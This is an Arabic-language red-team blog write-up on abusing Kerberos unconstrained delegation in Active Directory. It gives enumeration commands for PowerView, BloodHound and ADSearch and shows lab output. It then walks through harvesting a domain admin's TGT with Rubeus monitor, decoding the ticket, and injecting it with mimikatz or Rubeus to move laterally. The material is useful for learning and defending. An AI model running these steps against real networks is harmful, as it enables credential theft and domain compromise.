---
title:  Unconstrained Delegation
date: 2022-09-17 22:42:00 +0300
categories: [Writeup, PostExploit]
tags: [Active Directory]     # TAG names should always be lowercase
---


 



## Attack
&#x202b;
بسم الله الرحمن الرحيم.
سنتطرق اليوم بمشيئة الله لشرح الـ `unconstrained delegation` 
&#x202b;
### Unconstrained delegation
&#x202b;
الدلقيشن يسمح لمستخدم أو خدمة للعمل نيابةً عن سيرفس اكاونت او مستخدم أخر  

&#x202b;
بعدما تعرفنا على الدلقيشن بطريقة مبسطه سنتعمق الان في تفاصيل اكثر لنفهم طريقة عمل هذه الهجمة
إذا كان الـ `unconstrained delegation` مفعل في جهاز الكمبيوتر الـ `KDC` سيكون محتوي على الـ `TGT` لليوزر داخل الـ `TGS` 
وبهذه الحاله سنتفرض أن لدينا خادم ويب يحتاج للوصول لسيرفر قاعدةالبيانات نيابة عن مستخدم اخر، في هذه الحالة خادم الويب
سيستخدم الـ `TGT` لطلب الـ `TGS` بسيرفس اكاونت موجود على سيرفر قاعدةالبيانات.
الجزء المهم لنا كـ `RedTeamers` هو أن `unconstrained delegation` بدورها كخدمة ستقوم بتخزين الـ `TGT` الخاصة بالمستخدم في حال دخوله لجهاز مفعله لديه هذه الخدمه.  

&#x202b;
وللتوضيح أكثر سنستعرض مثال بسيط:
فلنفترض أن الدومين أدمن دخل لجهاز مفعله لديه هذه الخدمة وقام بالدخول على أي خدمة كانت في جهاز `A` على سبيل المثال، في هذه الحاله ستكون الـ `TGT` الخاصة بحساب الدومين أدمن مخزنه في ميموري الجهاز `A`، ونستطيع نحن كـ `RedTemaer` إستغلال هذه الخدمة وإستخراج ال `TGT` الخاصة بالدومين أدمن او اي يوزر نقوم بإستهدافه.  

&#x202b;
سننتقل الان لشرح يوضح هذا التكنيك بطريقة عملية  


### Enumeration
&#x202b;
عن طريق المودل `PowerView` نستطيع عمل `Enumeration` لمعرفة الدومين كمبيوتر اللتي مفعل فيها هذه الخدمة
```
Get-DomainComputer -UnConstrained
```  
&#x202b;
وأيضًا عن طريق `BloodHoundAd` نستطيع عمل `Enumeration` لمعرفة الدومين كمبيوتر المفعلة فيها هذه الخدمة
```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```  
&#x202b;
وأيضًا عن طريق `ADSearch.exe` نستطيع عمل `Enumeration` لمعرفة الدومين كمبيوتر المفعلة فيها هذه الخدمة
```
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```


&#x202b;
## Exploit
&#x202b;
سنقوم في البداية بعمل `Enumeration`  
```sh
PS C:\Users\0xMaz> cd .\Desktop\
PS C:\Users\0xMaz\Desktop> . .\PowerView.ps1
PS C:\Users\0xMaz\Desktop> Get-DomainComputer -UnConstrained


pwdlastset                    : 5/16/2019 1:10:20 AM
logoncount                    : 512
msds-generationid             : {36, 225, 107, 217...}
serverreferencebl             : CN=Test-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=0xMaz,D
                                C=local
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=Test-DC1,OU=Domain Controllers,DC=us,DC=0xMaz,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 9/16/2022 9:01:42 PM
name                          : Test-DC1
objectsid                     : S-1-5-21-3965405831-1015596948-2589850225-1000
samaccountname                : Test-DC1$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 9/17/2022 4:01:42 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2016 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=Test-DC1,CN=Topology,CN=Domain System
                                Volume,CN=DFSR-GlobalSettings,CN=System,DC=us,DC=0xMaz,DC=local
objectguid                    : 68412feb-0296-4eeb-8886-ae49b2779f64
operatingsystemversion        : 10.0 (14393)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=0xMaz,DC=local
dscorepropagationdata         : {2/1/2019 6:23:00 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {ldap/Test-DC1.us.0xMaz.local/DomainDnsZones.us.0xMaz.local,
                                ldap/Test-DC1.us.0xMaz.local/ForestDnsZones.0xMaz.local,
                                Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/Test-DC1.us.0xMaz.local, TERMSRV/Test-DC1...}
usncreated                    : 12293
lastlogon                     : 9/17/2022 3:55:06 AM
badpwdcount                   : 0
cn                            : Test-DC1
useraccountcontrol            : SERVER_TRUST_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_FOR_DELEGATION
whencreated                   : 2/1/2019 6:23:00 AM
primarygroupid                : 516
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 648313
ridsetreferences              : CN=RID Set,CN=Test-DC1,OU=Domain Controllers,DC=us,DC=0xMaz,DC=local
dnshostname                   : Test-DC1.us.0xMaz.local

logoncount                    : 372
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=UFC-WEBPROD,OU=Servers,DC=us,DC=0xMaz,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 9/16/2022 9:01:45 PM
objectsid                     : S-1-5-21-3965405831-1015596948-2589850225-1104
samaccountname                : UFC-WEBPROD$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : UFC-WEBPROD
accountexpires                : NEVER
whenchanged                   : 9/17/2022 4:01:45 AM
instancetype                  : 4
usncreated                    : 12921
objectguid                    : 552cbb64-f3ff-4b35-a9f1-7f68dd07b9a1
operatingsystem               : Windows Server 2016 Standard
operatingsystemversion        : 10.0 (14393)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=0xMaz,DC=local
dscorepropagationdata         : {2/6/2019 12:46:32 PM, 1/1/1601 12:00:00 AM}
serviceprincipalname          : {TERMSRV/UFC-WEBPROD, TERMSRV/UFC-WebProd.us.0xMaz.local, WSMAN/UFC-WebProd,
                                WSMAN/UFC-WebProd.us.0xMaz.local...}
lastlogon                     : 9/17/2022 11:35:19 AM
iscriticalsystemobject        : False
usnchanged                    : 648319
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_FOR_DELEGATION
whencreated                   : 2/1/2019 6:37:47 AM
primarygroupid                : 515
pwdlastset                    : 12/14/2019 9:26:58 PM
msds-supportedencryptiontypes : 28
name                          : UFC-WEBPROD
dnshostname                   : UFC-WebProd.us.0xMaz.local



PS C:\Users\0xMaz\Desktop>
```  
&#x202b;
وعن طريق الـ `ADSearch`  



![image](https://user-images.githubusercontent.com/54814433/190872429-1a433254-1fdd-4a13-a84a-a3de8f1e0da2.png)  

&#x202b;
سنجد أن الكمبيوترين `SRV-1 , DC-2` مفعل لديهما الـ `Unconstrained Delegation`  

&#x202b;
تنويه: الدومين كنترولر تكون مفعله لديه هذه الخدمة تلقائيًا ولكنها لن تفيدنا لانه إذا وصلنا له فنحن دومين ادمن لانحتاج لهذا التكنيك.  

&#x202b;
أولا سنحتاج للوصول للسيرفر `SRV-1` لتفعيل المونيتور مود عن طريق أداة `Rubeus` وإنتظار الدومين أدمن أو اي يوزر ذو صلاحيات عاليه للدخول عليه، وبما ان هذا السيرفر مفعل عليه الـ `Unconstrained Delegation` فسيقوم بحفظ التذكره`TGT` لاي يوزر يقوم بالدخول عليه او استخدام اي خدمه يقدمها وتحتاج لـ `Kerberos Authentication`  
&#x202b;
وعن طريق هذاالسيرفر ستكون التذكرة محفوظه و نستطيع استخراج الـ `TGT` المحفوظه لهذا المستخدم  
&#x202b;
```
Rubeus.exe monitor /interval:10
```  
![image](https://user-images.githubusercontent.com/54814433/190873114-1f4bdba2-0e6e-40e0-9724-121b55d30312.png)
&#x202b;  
في هذه الحالة الاداة ستقوم بسحب جميع التذاكر المحفوظه وعمل مونيتور للتذاكر القادمة في حال دخول أي مستخدم جديد مثلما شرحنا سابقًا.  

![image](https://user-images.githubusercontent.com/54814433/190873503-3c67747e-14c7-4430-b547-3d72a49d3933.png)
وفي هذه الحاله حصلنا على التذكرة للدومين ادمن، لانه قام بالدخول للسيرفر.  

&#x202b;
وفي هذه الحاله سنقوم بأخذ التذكره وتحويلها وإضافتها للجهاز الخاص بنا.  
```
$ on Linux
$ echo 'base64' | base64 --decode > ticket.kirbi
```
```
$ On Windows
$ [System.IO.File]::WriteAllBytes("C:/Users/User/Ticket.kirbi", [System.Convert]::FromBase64String("base64"))
```  

&#x202b;
وسنقوم الان بحقن التذكره في الفوت هولد مشين ونستطيع تنفيذ `Remote-command` على الاجهزه المصرح للمستخدم صاحب التذكره عمل ذلك عليها.  

&#x202b;
ونستطيع حقن التذكره عن طريق ادوات كثيره ومن ضمنها:  

&#x202b;
 mimikatz.exe
```
> mimikatz.exe
# privilege::debug
# kerberos::ptt C:/Users/User/Ticket.kirbi
...
File: 'C:/Users/User/Ticket.kirbi': OK
...
> klist | findstr "Cached"
...
Cached Tickets: (1)
...
# exit
Bye!
```
Rubeus.exe
```
Rubeus.exe ptt /ticket:C:/Users/User/Ticket.kirbi
```  

&#x202b;
وبهذه الحاله سنكون انتقلنا من الفوتهولد مشين لأجهزه أخرى.  
تنويه: مدة التذكرة 10 ساعات
&#x202b;
